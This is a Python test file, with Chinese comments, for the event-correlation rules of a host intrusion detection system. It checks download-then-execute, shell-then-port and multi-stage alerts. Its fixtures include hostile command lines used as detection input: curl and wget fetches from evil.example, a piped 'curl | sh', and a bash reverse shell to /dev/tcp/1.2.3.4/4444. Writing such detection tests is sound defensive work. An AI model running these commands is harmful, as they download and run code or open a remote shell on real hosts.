"""CorrelationTracker 多事件关联测试（建议书 4.2：时间窗口行为链）。"""

from __future__ import annotations

from hids_server import threat


def make_tracker(window_sec: int = 60) -> threat.CorrelationTracker:
    return threat.CorrelationTracker(window_sec=window_sec)


def analyze(event: dict, correlator: threat.CorrelationTracker) -> dict:
    syn = threat.SynBurstTracker(1, 15)
    threat.analyze_event(event, syn, None, correlator)
    return event["threat"]


def rule_ids(t: dict) -> set[str]:
    return {r["id"] for r in t["rules"]}


def test_download_then_tmp_exec_fires_high():
    corr = make_tracker()
    analyze({"event_kind": 0, "host_id": "h1", "ts_ms": 1_000,
             "line": "curl http://evil.example/x.sh -o /tmp/x.sh"}, corr)
    t = analyze({"event_kind": 4, "host_id": "h1", "ts_ms": 5_000,
                 "exec_path": "/tmp/x.sh"}, corr)
    assert "corr_download_then_tmp_exec" in rule_ids(t)
    assert t["level"] == "high"
    # 证据链可解释：含触发信号与当前事件
    corr_rule = next(r for r in t["rules"] if r["id"] == "corr_download_then_tmp_exec")
    chain = corr_rule["evidence"]["chain"]
    assert chain[0]["signal"] == "download" and chain[1]["signal"] == "current_event"
    assert corr_rule["evidence"]["gap_ms"] == 4_000


def test_outside_window_does_not_fire():
    corr = make_tracker(window_sec=60)
    analyze({"event_kind": 0, "host_id": "h1", "ts_ms": 1_000,
             "line": "wget http://evil.example/x"}, corr)
    t = analyze({"event_kind": 4, "host_id": "h1", "ts_ms": 1_000 + 61_000,
                 "exec_path": "/tmp/x"}, corr)
    assert "corr_download_then_tmp_exec" not in rule_ids(t)


def test_different_host_does_not_correlate():
    corr = make_tracker()
    analyze({"event_kind": 0, "host_id": "h1", "ts_ms": 1_000,
             "line": "curl http://evil.example/x"}, corr)
    t = analyze({"event_kind": 4, "host_id": "h2", "ts_ms": 2_000,
                 "exec_path": "/tmp/x"}, corr)
    assert "corr_download_then_tmp_exec" not in rule_ids(t)


def test_dedup_within_window():
    """同主机同关联规则在窗口内只触发一次。"""
    corr = make_tracker()
    analyze({"event_kind": 0, "host_id": "h1", "ts_ms": 1_000,
             "line": "curl http://evil.example/a"}, corr)
    t1 = analyze({"event_kind": 4, "host_id": "h1", "ts_ms": 2_000,
                  "exec_path": "/tmp/a"}, corr)
    t2 = analyze({"event_kind": 4, "host_id": "h1", "ts_ms": 3_000,
                  "exec_path": "/tmp/b"}, corr)
    assert "corr_download_then_tmp_exec" in rule_ids(t1)
    assert "corr_download_then_tmp_exec" not in rule_ids(t2)


def test_shell_then_sensitive_port():
    corr = make_tracker()
    analyze({"event_kind": 0, "host_id": "h1", "ts_ms": 1_000,
             "line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}, corr)
    t = analyze({"event_kind": 2, "host_id": "h1", "ts_ms": 2_000,
                 "flow_dst_port": 22, "flow_dst_ip": "10.0.0.9"}, corr)
    assert "corr_shell_then_sensitive_port" in rule_ids(t)


def test_multi_stage_activity():
    """窗口内 ≥3 条不同规则命中触发多阶段兜底告警。"""
    corr = make_tracker()
    analyze({"event_kind": 2, "host_id": "h1", "ts_ms": 1_000,
             "flow_dst_port": 3306}, corr)                      # 规则 1
    analyze({"event_kind": 3, "host_id": "h1", "ts_ms": 2_000,
             "http_status": 400}, corr)                          # 规则 2
    t = analyze({"event_kind": 0, "host_id": "h1", "ts_ms": 3_000,
                 "line": "curl http://x | sh"}, corr)            # 规则 3
    assert "corr_multi_stage_activity" in rule_ids(t)


def test_no_timestamp_is_ignored():
    corr = make_tracker()
    hits = corr.observe({"event_kind": 4, "host_id": "h1", "exec_path": "/tmp/x"}, [])
    assert hits == []
